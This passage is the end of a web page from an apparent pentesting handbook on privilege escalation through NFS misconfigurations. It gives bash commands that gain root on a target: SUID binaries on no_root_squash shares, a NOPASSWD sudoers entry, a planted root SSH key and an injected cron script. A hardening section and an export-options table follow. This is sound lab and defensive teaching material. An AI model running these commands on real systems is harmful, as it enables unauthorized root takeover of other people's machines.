+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Test if share is writable</span>
+touch<span class="w"> </span>/mnt/nfs/test_file
+<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$?</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"[+] NFS share is writable"</span>
+<span class="k">fi</span>
+
+<span class="c1"># Test if you can create SUID binaries</span>
+cp<span class="w"> </span>/bin/bash<span class="w"> </span>/mnt/nfs/bash
+chmod<span class="w"> </span>+s<span class="w"> </span>/mnt/nfs/bash
+ls<span class="w"> </span>-la<span class="w"> </span>/mnt/nfs/bash
+<span class="c1"># If SUID bit is set, no_root_squash is enabled</span>
+</code></pre></div>
+<p><strong>Step 3: Choose Attack Vector</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Priority:</span>
+<span class="c1"># 1. no_root_squash -&gt; create SUID binary (instant root)</span>
+<span class="c1"># 2. Writable share -&gt; modify system files (sudoers, passwd, cron scripts)</span>
+<span class="c1"># 3. ID mapping -&gt; create local user with matching UID</span>
+<span class="c1"># 4. SSH keys -&gt; add SSH public key</span>
+<span class="c1"># 5. Cron scripts -&gt; inject malicious commands</span>
+</code></pre></div>
+<p><strong>Step 4: Create Exploit</strong>:</p>
+<p><strong>Option A - SUID Binary (no_root_squash)</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Using fakeroot (if you're not root)</span>
+fakeroot<span class="w"> </span>bash
+gcc<span class="w"> </span>-o<span class="w"> </span>/mnt/nfs/exploit<span class="w"> </span>exploit.c
+chmod<span class="w"> </span>+s<span class="w"> </span>/mnt/nfs/exploit
+chown<span class="w"> </span>root:root<span class="w"> </span>/mnt/nfs/exploit
+<span class="nb">exit</span><span class="w">  </span><span class="c1"># Exit fakeroot</span>
+
+<span class="c1"># Execute on target</span>
+/mnt/nfs/exploit
+</code></pre></div>
+<p><strong>Option B - Modify Sudoers</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If /etc/sudoers is on NFS</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'user ALL=(ALL) NOPASSWD: ALL'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/mnt/nfs/sudoers
+sudo<span class="w"> </span>bash
+</code></pre></div>
+<p><strong>Option C - Add SSH Key</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If /root/.ssh/ is on NFS</span>
+mkdir<span class="w"> </span>-p<span class="w"> </span>/mnt/nfs/root/.ssh
+<span class="nb">echo</span><span class="w"> </span><span class="s2">"ssh-rsa AAA..."</span><span class="w"> </span>&gt;<span class="w"> </span>/mnt/nfs/root/.ssh/authorized_keys
+chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>/mnt/nfs/root/.ssh/authorized_keys
+ssh<span class="w"> </span>root@target
+</code></pre></div>
+<p><strong>Option D - Cron Scripts</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If cron script is on NFS</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">cp /bin/bash /tmp/bash</span>
+<span class="s1">chmod +s /tmp/bash'</span><span class="w"> </span>&gt;<span class="w"> </span>/mnt/nfs/backup.sh
+chmod<span class="w"> </span>+x<span class="w"> </span>/mnt/nfs/backup.sh
+
+<span class="c1"># Wait for cron execution</span>
+/tmp/bash<span class="w"> </span>-p
+</code></pre></div>
+<p><strong>Step 5: Trigger Execution</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If SUID binary: just execute</span>
+/mnt/nfs/exploit
+
+<span class="c1"># If sudoers: sudo bash</span>
+sudo<span class="w"> </span>bash
+
+<span class="c1"># If SSH keys: ssh root@target</span>
+ssh<span class="w"> </span>root@target
+
+<span class="c1"># If cron scripts: wait</span>
+<span class="c1"># Or force cron execution (if possible)</span>
+crontab<span class="w"> </span>-l<span class="w">  </span><span class="c1"># Check next execution time</span>
+</code></pre></div>
+<p><strong>Step 6: Verify</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">id
+<span class="c1"># uid=0(root) gid=0(root)</span>
+whoami
+<span class="c1"># root</span>
+</code></pre></div>
+<hr/>
+<h3 id="6-defensive-measures">6. Defensive Measures<a aria-label="Link to this section" class="g-anchor" href="#6-defensive-measures">#</a></h3>
+<p><strong>For System Administrators</strong>:</p>
+<ol>
+<li>
+<p><strong>Never Use no_root_squash</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># BAD</span>
+/share<span class="w"> </span>*<span class="o">(</span>rw,no_root_squash<span class="o">)</span>
+
+<span class="c1"># GOOD</span>
+/share<span class="w"> </span>*<span class="o">(</span>rw,root_squash<span class="o">)</span>
+<span class="c1"># root_squash is default</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Use Anonuid/Anongid Mapping</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Map all remote users to a specific user</span>
+/share<span class="w"> </span>*<span class="o">(</span>rw,anonuid<span class="o">=</span><span class="m">65534</span>,anongid<span class="o">=</span><span class="m">65534</span><span class="o">)</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Restrict Exports with IP Ranges</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Allow only specific subnets</span>
+/share<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="o">(</span>rw,sync,no_subtree_check<span class="o">)</span>
+/share<span class="w"> </span><span class="m">10</span>.0.0.0/8<span class="o">(</span>rw,sync,no_subtree_check<span class="o">)</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Use Read-Only Where Possible</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># BAD (writable)</span>
+/share<span class="w"> </span>*<span class="o">(</span>rw<span class="o">)</span>
+
+<span class="c1"># GOOD (read-only)</span>
+/share<span class="w"> </span>*<span class="o">(</span>ro<span class="o">)</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Set Proper File Permissions</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Ensure exported directory has proper permissions</span>
+chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/share
+chown<span class="w"> </span>root:root<span class="w"> </span>/share
+</code></pre></div>
+</li>
+<li>
+<p><strong>Use NFSv4 with Kerberos</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Secure authentication</span>
+/share<span class="w"> </span>*<span class="o">(</span><span class="nv">sec</span><span class="o">=</span>krb5p:krb5i:krb5<span class="o">)</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Mount Options</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Client-side security</span>
+mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>-o<span class="w"> </span>nosuid,noexec,nodev<span class="w"> </span>target:/share<span class="w"> </span>/mnt/nfs
+<span class="c1"># Prevent SUID binaries, executable files, and device files</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Firewall Protection</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Restrict NFS ports</span>
+iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">2049</span><span class="w"> </span>-s<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-j<span class="w"> </span>ACCEPT
+iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">2049</span><span class="w"> </span>-j<span class="w"> </span>DROP
+</code></pre></div>
+</li>
+<li>
+<p><strong>Monitor NFS Activity</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Audit NFS access</span>
+auditctl<span class="w"> </span>-w<span class="w"> </span>/etc/exports<span class="w"> </span>-p<span class="w"> </span>wa<span class="w"> </span>-k<span class="w"> </span>nfs_exports
+auditctl<span class="w"> </span>-w<span class="w"> </span>/share<span class="w"> </span>-p<span class="w"> </span>rwxa<span class="w"> </span>-k<span class="w"> </span>nfs_share
+
+<span class="c1"># Monitor NFS connections</span>
+netstat<span class="w"> </span>-tn<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="m">2049</span>
+</code></pre></div>
+</li>
+<li>
+<p><strong>Regular Audits</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check for no_root_squash</span>
+exportfs<span class="w"> </span>-v<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>no_root_squash
+
+<span class="c1"># Check for writable NFS mounts</span>
+<span class="k">for</span><span class="w"> </span>mount<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>mount<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>nfs<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $3}'</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">"</span><span class="nv">$mount</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"Warning: Writable NFS mount: </span><span class="nv">$mount</span><span class="s2">"</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">done</span>
+</code></pre></div>
+</li>
+</ol>
+<hr/>
+<h3 id="7-nfs-export-options-cheatsheet">7. NFS Export Options Cheatsheet<a aria-label="Link to this section" class="g-anchor" href="#7-nfs-export-options-cheatsheet">#</a></h3>
+<div class="g-table-wrap"><table class="g-table">
+<thead>
+<tr>
+<th>Option</th>
+<th>Description</th>
+<th>Security Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>rw</code></td>
+<td>Read/Write</td>
+<td>High - allows file modification</td>
+</tr>
+<tr>
+<td><code>ro</code></td>
+<td>Read-Only</td>
+<td>Low - only file reading</td>
+</tr>
+<tr>
+<td><code>no_root_squash</code></td>
+<td>Root privileges preserved</td>
+<td><strong>Critical</strong> - root escalation</td>
+</tr>
+<tr>
+<td><code>root_squash</code></td>
+<td>Root mapped to nobody</td>
+<td>Safe - prevents root access</td>
+</tr>
+<tr>
+<td><code>all_squash</code></td>
+<td>All users mapped to nobody</td>
+<td>Very Safe - no privileges</td>
+</tr>
+<tr>
+<td><code>anonuid</code></td>
+<td>UID for anonymous users</td>
+<td>Medium - can be exploited</td>
+</tr>
+<tr>
+<td><code>anongid</code></td>
+<td>GID for anonymous users</td>
+<td>Medium - can be exploited</td>
+</tr>
+<tr>
+<td><code>insecure</code></td>
+<td>Allow high port connections</td>
+<td>Medium - firewall bypass</td>
+</tr>
+<tr>
+<td><code>secure</code></td>
+<td>Require privileged ports</td>
+<td>Safer - restricts connections</td>
+</tr>
+<tr>
+<td><code>no_subtree_check</code></td>
+<td>No submount verification</td>
+<td>Low - performance</td>
+</tr>
+<tr>
+<td><code>subtree_check</code></td>
+<td>Verify submounts</td>
+<td>Safer - prevents traversal</td>
+</tr>
+<tr>
+<td><code>nohide</code></td>
+<td>Show submounts</td>
+<td>Low - information leak</td>
+</tr>
+<tr>
+<td><code>hide</code></td>
+<td>Hide submounts</td>
+<td>Safer - less information</td>
+</tr>
+<tr>
+<td><code>fsid=0</code></td>
+<td>Root filesystem export</td>
+<td>High - filesystem access</td>
+</tr>
+<tr>
+<td><code>sync</code></td>
+<td>Synchronous writes</td>
+<td>Safe - data integrity</td>
+</tr>
+<tr>
+<td><code>async</code></td>
+<td>Asynchronous writes</td>
+<td>Medium - potential data loss</td>
+</tr>
+</tbody>
+</table></div>
+</div>
+      <p class="g-source-note">Privilege Escalation handbook: Part 10 of 10. Adapted from <a href="https://github.com/JoramMalley/Linux-privilege-escalation" target="_blank" rel="noopener noreferrer">JoramMalley's Linux privilege escalation notes</a> and corrected where public advisories differ. Verify every version, CVE and command against vendor documentation. Use only in labs, CTFs or systems you own and have written permission to test.</p>
+      <div class="g-foundation-cta">
+        <div>
+          <p class="g-kicker">Apply it</p>
+          <strong>Automate the enumeration.</strong>
+          <p>Chapter 26 turns these checks into a repeatable collection and validation pass.</p>
+        </div>
+        <a class="g-btn primary" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+          Open Chapter 26 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m13 6 6 6-6 6"/></svg>
+        </a>
+      </div>
+      <nav class="g-chapter-nav" aria-label="Privilege escalation navigation"><a class="g-chapter-card" href="../privesc/09-service-misconfigurations.html" data-prev-privesc><span class="g-chapter-card-label">Previous / Part 09</span><strong>Service Misconfigurations</strong></a><a class="g-chapter-card" href="../chapters/26-automating-linux-privilege-escalation-checks.html"><span class="g-chapter-card-label">Main guide</span><strong>Apply the checks in Chapter 26</strong></a></nav>
+    </article>
+  </main>
+  
+<aside class="g-toc" aria-label="On this page">
+  <div class="g-toc-inner">
+    <p class="g-toc-kicker">On this page</p>
+    <nav class="g-toc-nav"><a class="g-toc-link depth-2" href="#nfs-misconfigurations-for-privilege-escalation" data-toc-link>NFS Misconfigurations for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-nfs" data-toc-link>1. Understanding NFS</a><a class="g-toc-link depth-3" href="#2-enumeration-finding-nfs-shares" data-toc-link>2. Enumeration: Finding NFS Shares</a><a class="g-toc-link depth-3" href="#3-exploitation-vectors" data-toc-link>3. Exploitation Vectors</a><a class="g-toc-link depth-3" href="#4-nfs-in-containerized-environments" data-toc-link>4. NFS in Containerized Environments</a><a class="g-toc-link depth-3" href="#5-practical-exploitation-workflow" data-toc-link>5. Practical Exploitation Workflow</a><a class="g-toc-link depth-3" href="#6-defensive-measures" data-toc-link>6. Defensive Measures</a><a class="g-toc-link depth-3" href="#7-nfs-export-options-cheatsheet" data-toc-link>7. NFS Export Options Cheatsheet</a></nav>
+    <div class="g-toc-foot">Part 10 / 8 sections</div>
+  </div>
+</aside>
+</div>
+<footer class="g-site-foot g-docs-foot">
+  <div class="g-foot-main">
+    <span>0XMAP field guide / 30 chapters / 2 companion handbooks</span>
+    <span>Created by 0xbit</span>
+  </div>
+  <div class="g-foot-links">
+    <a href="../index.html">Home</a>
+    <a href="../index.html#foundations">Foundations</a>
+    <a href="../index.html#privesc">Privilege escalation</a>
+    <a href="../index.html#chapters">Chapters</a>
+    <button type="button" class="g-link-btn" data-search-open>Search</button>
+  </div>
+</footer>
+  
+<div class="g-search" data-search-modal hidden>
+  <div class="g-search-panel" role="dialog" aria-modal="true" aria-labelledby="g-search-title">
+    <div class="g-search-top">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+      <label class="g-visually-hidden" for="g-search-input" id="g-search-title">Search the guide</label>
+      <input class="g-search-input" id="g-search-input" data-search-input type="search"
+             placeholder="Search chapters, handbooks and commands..." autocomplete="off" spellcheck="false">
+      <kbd>Esc</kbd>
+      <button type="button" class="g-icon-btn" data-search-close aria-label="Close search">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+      </button>
+    </div>
+    <div class="g-search-results" data-search-results></div>
+    <div class="g-search-foot">
+      <span><kbd>Up</kbd><kbd>Down</kbd> to move</span>
+      <span><kbd>Enter</kbd> to open</span>
+      <span data-search-count></span>
+    </div>
+  </div>
+</div>
+  <script src="../static/guide-data.js"></script>
+  <script src="../static/guide.js" defer></script>
+</body>
+</html>
